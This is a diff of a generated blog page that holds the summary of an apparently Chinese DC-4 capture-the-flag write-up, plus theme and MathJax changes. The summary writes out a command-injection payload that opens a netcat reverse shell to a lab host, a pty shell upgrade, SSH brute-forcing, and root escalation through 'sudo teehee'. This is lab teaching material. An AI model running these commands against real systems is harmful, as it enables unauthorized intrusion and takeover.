+<p>If you enjoyed this CTF, send me a tweet via <span class="citation" data-cites="DCAU7">@DCAU7</span>. <strong>root@dc-4:/root# </strong></p>
 </blockquote>
-<br>
-<br>
-
+<p><br> <br></p>
 <p>总结</p>
 <ul>
 <li>nmap扫网段，靶机端口</li>
 <li>dirsearch扫目录</li>
 <li>burpsuite爆破后台</li>
 <li>进入后台发现能执行部分命令并抓包修改发现能命令执行</li>
-<li>反弹shell<blockquote>
-<p>反弹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burp改包<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>使用python得到交互式shell<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
-</blockquote>
-</li>
+<li>反弹shell &gt; 反弹shell &gt; kali@kali2020:~$ nc -lvp 8888 &gt;
+burp改包 &gt; radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run
+使用python得到交互式shell &gt; python -c 'import
+pty;pty.spawn("/bin/bash")'</li>
 <li>cat /etc/passwd 发现三个用户，并查看信息</li>
 <li>ssh用户爆破</li>
-<li><strong>teehee提权</strong><blockquote>
-<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
-</blockquote>
-</li>
+<li><strong>teehee提权</strong> &gt; teehee可通过echo "xxx"|sudo teehee
+-a 'file'的方式将内容写入到用户无法直接操作的文件中</li>
 <li>创建管理员身份并切换</li>
 <li>得到flag</li>
 </ul>
-<br>
-
-<br>
-
-<br>
-
-<br>
-
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
 <p>Reference</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
+<p>https://blog.csdn.net/weixin_44288604/article/details/108018008</p>
+<p>https://www.pianshen.com/article/9999990100/</p>
+<p>https://blog.csdn.net/Nicky_Zheng/article/details/113173929</p>
 </blockquote>
 
     </div>
@@ -605,7 +722,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -653,7 +770,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -667,7 +784,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -678,7 +795,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -818,6 +935,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
